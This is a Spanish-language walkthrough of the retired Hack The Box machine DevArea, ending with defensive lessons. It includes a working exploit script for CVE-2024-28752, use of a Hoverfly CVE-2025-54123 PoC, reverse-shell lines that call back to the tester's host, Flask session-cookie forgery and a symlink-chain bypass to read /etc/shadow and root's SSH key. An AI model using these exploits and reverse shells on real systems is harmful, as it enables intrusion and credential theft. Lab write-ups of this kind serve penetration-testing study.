# Writeup: DevArea (Hack The Box — Retirada)

DevArea es una máquina **Media** que simula un entorno de desarrollo con múltiples servicios expuestos. El recorrido comienza con la enumeración de puertos y el acceso anónimo a un servidor FTP, donde se descarga un archivo JAR que contiene un servicio SOAP. Este servicio es vulnerable a **CVE-2024-28752** (SSRF en Apache CXF), lo que permite leer archivos del sistema y obtener credenciales de Hoverfly. A continuación, se explota **CVE-2025-54123** (inyección de comandos en Hoverfly) para obtener una reverse shell como `dev_ryan`. Posteriormente, se abusa de una inyección de comandos en la interfaz web de SysWatch y una vulnerabilidad de symlink traversal en `syswatch.sh` para escalar privilegios hasta **root**.

---

## Fase 1: Reconocimiento

Lanzamos un escaneo completo de puertos con Nmap:

```bash
sudo nmap -sS --min-rate 500 -p- -n -Pn -vv 10.129.47.222 -oG allPorts
```

**Resultado:**

```bash
Discovered open port 8080/tcp on 10.129.47.222
Discovered open port 22/tcp on 10.129.47.222
Discovered open port 8888/tcp on 10.129.47.222
Discovered open port 80/tcp on 10.129.47.222
Discovered open port 21/tcp on 10.129.47.222
```

Usamos `extractPorts` para extraer la IP y los puertos abiertos:

```bash
extractPorts allPorts
```

```bash
[*] Extrayendo información...
        [*] Dirección IP: 10.129.47.222
        [*] Puertos abiertos: 21,22,80,8080,8500,8888
[*] Puertos copiados al portapapeles
```

Realizamos un escaneo de servicios y versiones:

```bash
nmap -sVC -p 21,22,80,8080,8500,8888 10.129.47.222 -oN targeted
```

**Resultados clave:**

```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: DevArea - Connect with Top Development Talent
8080/tcp open  http    Jetty 9.4.27.v20200227
8500/tcp open  http    Golang net/http server
|_This is a proxy server. Does not respond to non-proxy requests.
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
```

**Observaciones clave:**

- **FTP anónimo** habilitado en el puerto 21.
- **Apache** en el puerto 80 (sitio estático).
- **Jetty** en el puerto 8080.
- **Proxy** en el puerto 8500.
- **Hoverfly Dashboard** en el puerto 8888.

Añadimos el dominio a `/etc/hosts`:

```bash
echo "10.129.47.222 devarea.htb" >> /etc/hosts
```

---

## Fase 2: Enumeración FTP

El escaneo reveló que el servicio FTP permite autenticación anónima. Nos conectamos:

```bash
ftp 10.129.47.222
```

```bash
230 Login successful.
ftp> ls
229 Entering Extended Passive Mode (|||43239|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 22  2025 ..
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
```

Descargamos el archivo JAR:

```bash
ftp> get employee-service.jar
local: employee-service.jar remote: employee-service.jar
229 Entering Extended Passive Mode (|||42056|)
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
100% |******************************************************************|  6293 KiB    1.17 MiB/s    00:00 ETA
226 Transfer complete.
6445030 bytes received in 00:05 (1.07 MiB/s)
```

---

## Fase 3: Análisis del archivo JAR

Extraemos el contenido del JAR:

```bash
unzip employee-service.jar -d employee-service-extracted
```

Revisando la estructura del proyecto, encontramos que el servicio expone un endpoint SOAP en el puerto 8080:

```bash
curl http://devarea.htb:8080/employeeservice?wsdl
```

```xml
<wsdl:definitions name="EmployeeServiceService" targetNamespace="http://devarea.htb/">
<wsdl:types>
<xs:schema elementFormDefault="unqualified" targetNamespace="http://devarea.htb/" version="1.0">
<xs:element name="submitReport" type="tns:submitReport"/>
<xs:complexType name="submitReport">
<xs:sequence>
<xs:element minOccurs="0" name="arg0" type="tns:report"/>
</xs:sequence>
</xs:complexType>
<xs:complexType name="report">
<xs:sequence>
<xs:element name="confidential" type="xs:boolean"/>
<xs:element minOccurs="0" name="content" type="xs:string"/>
<xs:element minOccurs="0" name="department" type="xs:string"/>
<xs:element minOccurs="0" name="employeeName" type="xs:string"/>
</xs:sequence>
</xs:complexType>
...
</wsdl:definitions>
```

El servicio tiene un método `submitReport` que acepta un objeto `report` con campos `content`, `department` y `employeeName`.

### Pruebas de XXE

Intentamos un ataque XXE clásico:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">
  <soapenv:Header/>
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content>&xxe;</content>
        <department>IT</department>
        <employeeName>test</employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
```

```bash
curl -X POST http://devarea.htb:8080/employeeservice \
  -H "Content-Type: text/xml;charset=UTF-8" \
  -H 'SOAPAction: ""' \
  --data-binary @payload.xml
```

```bash
<soap:Fault><faultcode>soap:Client</faultcode>
<faultstring>Error reading XMLStreamReader: Received event DTD, instead of START_ELEMENT or END_ELEMENT.</faultstring>
</soap:Fault>
```

El XXE fue bloqueado.

---

## Fase 4: Apache CXF SSRF (CVE-2024-28752)

Revisando las dependencias en el archivo `pom.xml`, encontramos que el servicio utiliza **Apache CXF 3.2.14**, que es vulnerable a **CVE-2024-28752** (SSRF mediante Aegis DataBinding). Esta vulnerabilidad permite leer archivos locales utilizando el esquema `file://` en combinación con XOP (XML-binary Optimized Packaging).

### Script de explotación

Para facilitar la enumeración, creé el siguiente script `exploit.py`:

```python
#!/usr/bin/env python3
import subprocess
import base64
import re

TARGET = "http://devarea.htb:8080/employeeservice"

def exploit_lfi(file_path):
    # Aseguramos que la ruta tenga el prefijo file://
    if not file_path.startswith("file://"):
        if file_path.startswith("/"):
            file_path = "file://" + file_path
        else:
            file_path = "file:///" + file_path

    # Construimos el cuerpo multipart
    payload = f"""------kkkkkk123123213
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">
   <soapenv:Header/>
   <soapenv:Body>
      <dev:submitReport>
         <arg0>
            <confidential>false</confidential>
            <content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="{file_path}"></xop:Include></content>
            <department>IT</department>
            <employeeName>tester</employeeName>
         </arg0>
      </dev:submitReport>
   </soapenv:Body>
</soapenv:Envelope>
------kkkkkk123123213--"""

    cmd = [
        "curl", "-s", "-X", "POST", TARGET,
        "-H", "Content-Type: multipart/related; boundary=----kkkkkk123123213",
        "-H", "SOAPAction: \"\"",
        "--data-binary", payload
    ]

    print(f"[*] Solicitando archivo: {file_path}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    response = result.stdout

    # Extraemos la cadena base64
    match = re.search(r'Content: (.*?)</return>', response, re.DOTALL)
    if match:
        b64_string = match.group(1).strip()
        if not b64_string:
            print("[-] El archivo está vacío o no existe en esa ruta.\n")
            return

        try:
            decoded_bytes = base64.b64decode(b64_string)
            decoded_str = decoded_bytes.decode('utf-8', errors='ignore')
            print("\n" + "="*50)
            print(decoded_str)
            print("="*50 + "\n")
        except Exception as e:
            print(f"[-] Error al decodificar base64: {e}\n")
    else:
        print("[-] No se encontró el contenido en la respuesta.")
        print(response + "\n")

if __name__ == "__main__":
    print("Script para explotar CVE-2024-28752 (LFI Reflejado en Apache CXF)")
    print(f"Objetivo: {TARGET}")
    print("Escribe 'exit' o 'quit' para salir.\n")

    while True:
        file_to_read = input("Ruta del archivo (ej. /etc/passwd): ").strip()
        if file_to_read.lower() in ['exit', 'quit']:
            break
        if file_to_read:
            exploit_lfi(file_to_read)
```

### Explotación

```bash
python3 exploit.py
```

```bash
Script para explotar CVE-2024-28752 (LFI Reflejado en Apache CXF)
Objetivo: http://devarea.htb:8080/employeeservice
Escribe 'exit' o 'quit' para salir.

Ruta del archivo (ej. /etc/passwd): /etc/passwd
[*] Solicitando archivo: file:///etc/passwd

==================================================
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
==================================================
```

El archivo `/etc/passwd` revela la existencia de los usuarios `dev_ryan` y `syswatch`.

### Enumeración de archivos

Seguimos leyendo archivos para encontrar credenciales. Probamos con `/etc/systemd/system/hoverfly.service`:

```bash
Ruta del archivo (ej. /etc/passwd): /etc/systemd/system/hoverfly.service
[*] Solicitando archivo: file:///etc/systemd/system/hoverfly.service

==================================================
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
==================================================
```

Obtenemos las credenciales de Hoverfly: **`admin:O7IJ27MyyXiU`**.

---

## Fase 5: Hoverfly Command Injection (CVE-2025-54123)

Con las credenciales de Hoverfly, accedemos al panel de administración en `http://devarea.htb:8888`. Identificamos que la versión es **v1.11.3**, que es vulnerable a **CVE-2025-54123** (inyección de comandos en el endpoint de middleware `/api/v2/hoverfly/middleware`).

### ¿Cómo funciona la vulnerabilidad?

La vulnerabilidad reside en la combinación de tres fallos:

1. **Validación insuficiente** en `middleware.go` donde el parámetro `binary` se asigna sin validación.
2. **Ejecución insegura de comandos** en `local_middleware.go` donde `exec.Command` ejecuta el binario controlado por el usuario.
3. **Ejecución inmediata** durante la prueba del middleware, que ejecuta el comando antes de completar la configuración.

### Explotación

Clonamos un PoC público:

```bash
git clone https://github.com/f4dee-backup/CVE-2025-54123
```

Ejecutamos el exploit para probar un comando:

```bash
./CVE-2025-54123.sh -t http://devarea.htb:8888 -u admin -p O7IJ27MyyXiU -c "id"
```

**Salida:**

```bash
[INFO] Target: http://devarea.htb:8888
[INFO] Command: id

[STEP] Checking target availability...
[OK] Target is reachable. Proceeding with authentication...

[STEP] Requesting authentication token...
[OK] Token acquired successfully.

[STEP] Retrieving Hoverfly version...
[INFO] Detected version: v1.11.3

[STEP] Checking if target version is vulnerable...
[OK] Vulnerable version detected: 1.11.3

[STEP] Attempting command execution via middleware...
[OK] Command executed successfully.

[OUTPUT]
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

### Reverse Shell

Creamos un script `shell.sh`:

```bash
cat > shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.17.44/443 0>&1
EOF
```

Montamos un servidor HTTP:

```bash
python3 -m http.server 8000
```

Ejecutamos el exploit para descargar y ejecutar el script:

```bash
./CVE-2025-54123.sh -t http://devarea.htb:8888 -u admin -p O7IJ27MyyXiU -c "curl -s http://10.10.17.44:8000/shell.sh | bash"
```

En nuestra máquina Kali, recibimos la conexión:

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.44] from (UNKNOWN) [10.129.244.208] 43806
bash: cannot set terminal process group (1402): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$
```

### Tratamiento de la TTY

```bash
dev_ryan@devarea:/opt/HoverFly$ script -c bash /dev/null
Script started, output log file is '/dev/null'.
dev_ryan@devarea:/opt/HoverFly$ ^Z
zsh: suspended  nc -nlvp 443

stty raw -echo; fg
reset xterm
dev_ryan@devarea:/opt/HoverFly$ export TERM=xterm
```

Somos el usuario **`dev_ryan`**.

---

## Fase 6: Enumeración local como `dev_ryan`

### Permisos sudo

```bash
dev_ryan@devarea:/opt$ sudo -l
```

```bash
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

Podemos ejecutar `/opt/syswatch/syswatch.sh` como root, pero sin los subcomandos `web-stop` y `web-restart`.

### Directorios y permisos

```bash
dev_ryan@devarea:/opt$ ls -la
total 20
drwxr-xr-x   5 root root 4096 Mar 22 18:55 .
drwxr-xr-x  24 root root 4096 Mar 22 18:55 ..
drwxr-xr-x   4 root root 4096 Mar 22 18:55 EmployeeService
drwxr-xr-x   2 root root 4096 Mar 22 18:55 HoverFly
drwxr-xr-x+  8 root root 4096 Mar 22 18:55 syswatch

dev_ryan@devarea:/opt$ getfacl syswatch/
# file: syswatch/
# owner: root
# group: root
user::rwx
user:dev_ryan:---
group::r-x
mask::r-x
other::r-x
```

`dev_ryan` tiene acceso restringido al directorio, pero puede ejecutar el script.

### Puertos abiertos

```bash
dev_ryan@devarea:/opt$ ss -lntp
```

```bash
State     Recv-Q    Send-Q         Local Address:Port         Peer Address:Port    Process
LISTEN    0         128                127.0.0.1:7777              0.0.0.0:*
LISTEN    0         4096              127.0.0.54:53                0.0.0.0:*
LISTEN    0         4096                 0.0.0.0:22                0.0.0.0:*
LISTEN    0         511                  0.0.0.0:80                0.0.0.0:*
LISTEN    0         4096           127.0.0.53%lo:53                0.0.0.0:*
LISTEN    0         100                127.0.0.1:25                0.0.0.0:*
LISTEN    0         4096                       *:8888                    *:*        users:(("hoverfly",pid=1402,fd=6))
LISTEN    0         100                    [::1]:25                   [::]:*
LISTEN    0         32                         *:21                      *:*
LISTEN    0         4096                    [::]:22                   [::]:*
LISTEN    0         4096                       *:8500                    *:*        users:(("hoverfly",pid=1402,fd=5))
LISTEN    0         50                         *:8080                    *:*        users:(("java",pid=1401,fd=26))
```

El puerto 7777 está abierto localmente. Probamos a conectarnos:

```bash
dev_ryan@devarea:/opt$ curl 127.0.0.1:7777
```

```html
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login">/login</a>.
```

Es una interfaz web de SysWatch.

### Enumeración de archivos en `/home/dev_ryan`

```bash
dev_ryan@devarea:~$ ls -la
total 56
drwxr-x--- 5 dev_ryan dev_ryan  4096 Mar 10 16:28 .
drwxr-xr-x 3 root     root      4096 Dec  4  2025 ..
lrwxrwxrwx 1 root     root         9 Mar 10 16:28 .bash_history -> /dev/null
-rw-r--r-- 1 dev_ryan dev_ryan   220 Sep 21  2025 .bash_logout
-rw-r--r-- 1 dev_ryan dev_ryan  3771 Sep 21  2025 .bashrc
drwx------ 2 dev_ryan dev_ryan  4096 Sep 21  2025 .cache
drwxrwxr-x 3 dev_ryan dev_ryan  4096 Dec 12  2025 .local
-rw-r--r-- 1 dev_ryan dev_ryan   807 Sep 21  2025 .profile
drwx------ 2 dev_ryan dev_ryan  4096 Mar 11 12:59 .ssh
-rw-r--r-- 1 root     root     20260 Dec 14  2025 syswatch-v1.zip
-rw-r----- 1 root     dev_ryan    33 Jun 23 01:46 user.txt
```

Encontramos el archivo `syswatch-v1.zip` en el home de `dev_ryan`. Lo descargamos a nuestra máquina local para analizarlo:

```bash
# En la máquina víctima (como dev_ryan)
dev_ryan@devarea:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
# En nuestra máquina Kali
wget http://devarea.htb:8000/syswatch-v1.zip
```

```bash
unzip syswatch-v1.zip -d syswatch-extracted
```

---

## Fase 7: Análisis del código fuente de SysWatch (offline)

Analizando el archivo ZIP en mi máquina local, encontré la estructura completa del proyecto SysWatch. Entre los archivos más relevantes estaban:

- `syswatch.sh` — Script principal con funciones de gestión.
- `syswatch_gui/app.py` — Interfaz web Flask.
- `config/syswatch.conf` — Archivo de configuración.
- `setup.sh` — Script de instalación.

### Archivo de configuración y credenciales por defecto

Revisando `setup.sh`, encontré que si no se define `SYSWATCH_ADMIN_PASSWORD`, se usa una contraseña por defecto:

```bash
SYSWATCH_ADMIN_PASSWORD="${SYSWATCH_ADMIN_PASSWORD:-SyswatchAdmin2026}"
```

También vi que el instalador crea un archivo de entorno en `/etc/syswatch.env` con permisos `755`, lo que lo hace legible por otros usuarios locales.

### Vulnerabilidad en `app.py`

Analizando `syswatch_gui/app.py`, encontré la siguiente ruta vulnerable:

```python
SAFE_SERVICE = re.compile(r"^[^;/\&.<>\rA-Z]*$")

def service_status():
    # ...
    if request.method == "POST":
        service = request.form.get("service", "").strip()
        if not service or not SAFE_SERVICE.match(service):
            error = "Invalid service name"
        else:
            try:
                res = subprocess.run([f"systemctl status --no-pager {service}"], shell=True, capture_output=True, text=True, timeout=10)
                output = res.stdout if res.stdout else res.stderr
            except Exception as e:
                error = str(e)
```

La validación `SAFE_SERVICE` permite muchos caracteres, incluyendo `|`, `$`, y comillas. El uso de `shell=True` en `subprocess.run` convierte la entrada en un vector de inyección de comandos.

### Archivo de entorno en la máquina objetivo

Desde la shell de `dev_ryan`, confirmé la existencia del archivo de entorno:

```bash
dev_ryan@devarea:~$ cat /etc/syswatch.env
```

```bash
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
SYSWATCH_LOG_DIR=/opt/syswatch/logs
SYSWATCH_DB_PATH=/opt/syswatch/syswatch_gui/syswatch.db
SYSWATCH_PLUGIN_DIR=/opt/syswatch/plugins
SYSWATCH_BACKUP_DIR=/opt/syswatch/backup
SYSWATCH_VERSION=1.0.0
```

---

## Fase 8: Inyección de comandos en la interfaz web de SysWatch

### Generación de cookie de sesión Flask

Intentamos autenticarnos con la contraseña por defecto (`SyswatchAdmin2026`), pero falla. En su lugar, generamos una cookie de sesión Flask con la clave secreta:

```bash
cat > generate_flask_session.py << 'EOF'
#!/usr/bin/env python3
import argparse
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

def build_session_cookie(secret_key, user_id, username, session_name="session"):
    app = Flask(__name__)
    app.secret_key = secret_key
    app.config["SECRET_KEY"] = secret_key
    signing_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    data = {
        "_fresh": True,
        "_user_id": user_id,
        "user_id": user_id,
        "username": username,
    }
    payload = signing_serializer.dumps(data)
    return f"{session_name}={payload}"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate a Flask session cookie for SysWatch")
    parser.add_argument("--secret", required=True, help="Flask secret key")
    parser.add_argument("--user-id", default="1", help="Value to store in session['user_id']")
    parser.add_argument("--username", default="admin", help="Value to store in session['username']")
    parser.add_argument("--name", default="session", help="Cookie name (default: session)")
    args = parser.parse_args()
    cookie = build_session_cookie(args.secret, args.user_id, args.username, args.name)
    print(cookie)
EOF
```

```bash
python3 generate_flask_session.py --secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725' --user-id 1 --username admin
```

```bash
session=.eJyrVopPK0otzlCyKikqTdVRii8tTi2Kz0xRslIyVNJRwuTlJeamArmJKbmZeUq1AJlUFHg.akw3Zw.85X133ATZIn-h-Bofp1Tj6FJSr4
```

### Prueba de inyección de comandos

Usamos la cookie para acceder a la ruta `/service-status` y probar la inyección:

```bash
curl -s -b 'session=.eJyrVopPK0otzlCyKikqTdVRii8tTi2Kz0xRslIyVNJRwuTlJeamArmJKbmZeUq1AJlUFHg.akw3Zw.85X133ATZIn-h-Bofp1Tj6FJSr4' http://127.0.0.1:7777/service-status -d 'service=test || id'
```

```html
<h3>Result</h3>
<div class="log-box"><pre>uid=984(syswatch) gid=984(syswatch) groups=984(syswatch)</pre></div>
```

### Reverse Shell como `syswatch`

Creamos un script en `/tmp/sh`:

```bash
cat > /tmp/sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.17.44/443 0>&1
EOF
```

```bash
curl -s -b 'session=.eJyrVopPK0otzlCyKikqTdVRii8tTi2Kz0xRslIyVNJRwuTlJeamArmJKbmZeUq1AJlUFHg.akw3Zw.85X133ATZIn-h-Bofp1Tj6FJSr4' http://127.0.0.1:7777/service-status --data-urlencode "service=test || bash -c \"bash \$'\\x2f'tmp\$'\\x2f'sh\""
```

Recibimos la conexión:

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.44] from (UNKNOWN) [10.129.244.208] 43806
bash: cannot set terminal process group (1402): Inappropriate ioctl for device
bash: no job control in this shell
syswatch@devarea:~/syswatch_gui$ whoami
syswatch
```

Somos el usuario **`syswatch`**.

---

## Fase 9: Escalada a root — Symlink Traversal en syswatch.sh

### Análisis del script (continuación)

El script `syswatch.sh` tiene una función `view_logs()` que permite leer archivos de log. Analizando el código que extraje del ZIP:

```bash
view_logs() {
    local arg="${1:-}"
    # ...
    if [ -L "$path" ]; then
        local target
        target=$(ls -l "$path" | awk '{print $NF}')
        if [[ "$target" == *"/"* || "$target" == *".."* || "$target" == *"\\"* ]]; then
            echo "[Blocked unsafe symlink target]: $file -> $target"
            return 1
        fi
        if [[ "$target" =~ ^[A-Za-z0-9_.-]+$ ]]; then
            local resolved="$LOG_DIR/$target"
            if [ -f "$resolved" ]; then
                cat "$resolved"
                return
            else
                echo "[Symlink target not found]: $file -> $target"
                return 1
            fi
        fi
        # ...
    fi
}
```

El problema: la validación solo verifica el **primer** enlace simbólico, no el destino final. Si `evil.log` apunta a `secret`, y `secret` apunta a `/etc/shadow`, el script solo valida `secret` (que cumple con la regex) y luego intenta leer `/opt/syswatch/logs/secret`, que es otro symlink que apunta a `/etc/shadow`.

### Enumeración del directorio de logs

Desde la shell de `syswatch`, revisamos el directorio de logs:

```bash
syswatch@devarea:~/logs$ ls -la /opt/syswatch/logs/
total 8
drwxrwx--- 2 syswatch syswatch 4096 Jul  6 18:10 .
drwxr-xr-x 8 root     root     4096 Mar 22 18:55 ..
-rw-r--r-- 1 syswatch syswatch    0 Jul  6 17:39 system.log
```

`syswatch` tiene permisos de escritura en el directorio de logs.

### Bypass

Desde la shell de `syswatch` (que tiene permisos de escritura en el directorio de logs):

```bash
syswatch@devarea:~/logs$ ln -s /etc/shadow /opt/syswatch/logs/secret
syswatch@devarea:~/logs$ ln -s secret /opt/syswatch/logs/evil.log
```

Ahora, desde la shell de `dev_ryan` (que puede ejecutar el script con sudo), ejecutamos:

```bash
dev_ryan@devarea:/tmp$ sudo /opt/syswatch/syswatch.sh logs evil.log
```

```bash
root:$y$j9T$0KQ.TnjYkG3YsYKhdzY2I.$lGbupe1hBuVMuNFnjOfL4Oo7kFUTHPv2ocodVgqmdr9:20353:0:99999:7:::
daemon:*:20305:0:99999:7:::
bin:*:20305:0:99999:7:::
```

### Lectura de la clave privada SSH de root

```bash
syswatch@devarea:~/logs$ ln -s /root/.ssh/id_ed25519 /opt/syswatch/logs/secret3
syswatch@devarea:~/logs$ ln -s secret3 /opt/syswatch/logs/evil3.log
```

```bash
dev_ryan@devarea:/tmp$ sudo /opt/syswatch/syswatch.sh logs evil3.log
```

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt
VGxKxR/1NuFu3t8mowp/AAAADHJvb3RAZGV2YXJlYQE=
-----END OPENSSH PRIVATE KEY-----
```

### Acceso como root

Guardamos la clave privada y nos conectamos:

```bash
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@devarea.htb
```

```bash
root@devarea:~# id
uid=0(root) gid=0(root) groups=0(root)
root@devarea:~# cat /root/root.txt
[REDACTED]
```

¡Obtenemos la **flag de root**!

---

## Conclusión

DevArea es una máquina **Media** que combina:

1. **Enumeración FTP** para obtener un archivo JAR.
2. **Análisis del JAR** y descubrimiento de un servicio SOAP vulnerable a **CVE-2024-28752** (SSRF en Apache CXF).
3. **Lecura de archivos** mediante SSRF para obtener credenciales de Hoverfly.
4. **Explotación de CVE-2025-54123** en Hoverfly para obtener una reverse shell como `dev_ryan`.
5. **Enumeración local** y descubrimiento del archivo `syswatch-v1.zip` en el home de `dev_ryan`.
6. **Transferencia y análisis offline** del ZIP para identificar una inyección de comandos en la interfaz web de SysWatch y una vulnerabilidad de symlink traversal.
7. **Inyección de comandos** para escalar a `syswatch`.
8. **Symlink traversal** en `syswatch.sh` para leer la clave privada SSH de root.
9. **Acceso root** y obtención de la flag.

---

## Lecciones aprendidas

1. **Los servicios FTP anónimos pueden exponer información sensible**  
   El acceso anónimo al FTP permitió descargar un JAR que contenía la clave para el siguiente paso. Deshabilitar el acceso anónimo o limitar su contenido es crítico.

2. **Las vulnerabilidades en librerías de terceros son un riesgo significativo**  
   Apache CXF 3.2.14 contenía CVE-2024-28752, una SSRF que permitió leer archivos del sistema. Mantener las dependencias actualizadas es esencial.

3. **Las credenciales en archivos de servicio expuestos son un grave problema**  
   La contraseña de Hoverfly estaba en texto plano en `/etc/systemd/system/hoverfly.service`. Nunca almacenar credenciales en archivos de configuración de servicios.

4. **Las vulnerabilidades en herramientas de desarrollo pueden ser críticas**  
   Hoverfly v1.11.3 contenía una inyección de comandos que permitió RCE. Las herramientas de desarrollo deben estar aisladas y actualizadas.

5. **La validación de entrada en aplicaciones web debe ser rigurosa**  
   La interfaz de SysWatch usaba `shell=True` en `subprocess.run` sin sanitizar adecuadamente la entrada, permitiendo inyección de comandos.

6. **Las cadenas de enlaces simbólicos pueden eludir validaciones superficiales**  
   El script `syswatch.sh` solo verificaba el primer enlace, no el destino final, permitiendo leer archivos arbitrarios. Validar siempre el destino final con `realpath`.

7. **El contexto de usuario importa en la explotación**  
   La vulnerabilidad de symlinks en `syswatch.sh` solo era explotable porque `syswatch` tenía permisos de escritura en el directorio de logs. Controlar los permisos de escritura en directorios utilizados por scripts privilegiados es crucial.

8. **El análisis offline del código fuente es una técnica valiosa**  
   Al descargar el ZIP de SysWatch y analizarlo en mi máquina local, pude identificar vulnerabilidades con mayor facilidad utilizando herramientas como IA y editores de código. Esto demuestra que la enumeración local y la extracción de archivos son pasos fundamentales en un pentesting.
